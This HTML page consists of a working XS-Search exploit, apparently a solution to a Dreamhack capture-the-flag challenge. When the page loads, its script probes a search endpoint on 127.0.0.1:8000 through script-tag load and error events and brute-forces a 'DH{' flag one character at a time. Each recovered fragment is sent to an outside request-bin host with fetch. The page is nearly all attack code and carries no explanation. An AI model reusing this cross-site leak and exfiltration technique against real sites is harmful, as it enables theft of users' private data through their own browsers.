<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>XS-Search Site</h1>

        <script>
            async function req(url) {
                return await new Promise((resolve, reject) => {
                    const script = document.createElement("script");
                    script.src = url;
                    script.onload = resolve;
                    script.onerror = reject;

                    document.head.appendChild(script);
                });
            }

            async function search(query) {
                try {
                    await req(
                    `http://127.0.0.1:8000/search?query=${query}`
                    );
                    return true;
                } catch (e) {
                    return false;
                }
            }

            async function exploit() {
                let chars = "abcdefghijklmnopqrstuvwxyz0123456789"
                let secret_length = 36;
                let secret = "DH{";

                for (let i = 3; i < secret_length; i++) {
                    let found = false;

                    for (let c of chars) {
                        await new Promise(resolve => setTimeout(resolve, 100)); // Delay to avoid rate limiting
                        if (await search(secret + c)) {
                            secret += c;
                            fetch(`https://fyttbsg.request.dreamhack.games?flag=${encodeURIComponent(secret)}`, {
                                mode: 'no-cors'
                            });
                            console.log(`found: ${secret}`);
                            found = true;
                            break;
                        } else {
                            fetch(`https://fyttbsg.request.dreamhack.games?nop=nop`, {
                                mode: 'no-cors'
                            });
                        }
                    }

                    if (!found) {
                        console.error(`Character not found for position ${i}`);
                        break;
                    }
                }
            }

            exploit();
    </script>
</body>
</html>
